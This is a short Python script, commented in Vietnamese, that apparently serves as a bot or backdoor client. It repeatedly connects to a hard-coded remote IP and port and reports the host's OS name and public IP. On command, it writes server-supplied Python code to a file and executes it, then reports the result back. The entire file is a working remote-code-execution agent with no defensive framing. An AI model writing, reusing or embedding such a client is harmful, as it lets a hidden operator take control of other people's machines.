import socket
import json
import os

import requests

def get_ip():
    return requests.get('https://api.ipify.org').text

def run_code(code):
    # ghi code vào file
    with open('temp.py', 'w') as f:
        f.write(code)
    # chạy file
    os.system('python temp.py')
    
while True:
    try:
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the server
        server_address = ('3.18.29.6', 12345)
        client_socket.connect(server_address)
        command = {
            'cmd': 'add',
            'result': {
                'name': os.name,
                'ip': get_ip()
            }
        }
        json_command = json.dumps(command)
        client_socket.sendall(json_command.encode())
        
        
        
        
        data = client_socket.recv(1024).decode()
        data = json.loads(data)
        if data['cmd'] == 'python':
            code = data['code']
            try:
                run_code(code)
                client_socket.sendall(json.dumps({
                    'cmd': 'success',
                    'result': 'Success'
                }).encode())
            except Exception as e:
                client_socket.sendall(json.dumps({
                    'cmd': 'error',
                    'result': str(e)
                }).encode())

        if data['cmd'] == 'ping':
            print('Pong')
            
    except Exception as e:
        print(e)
    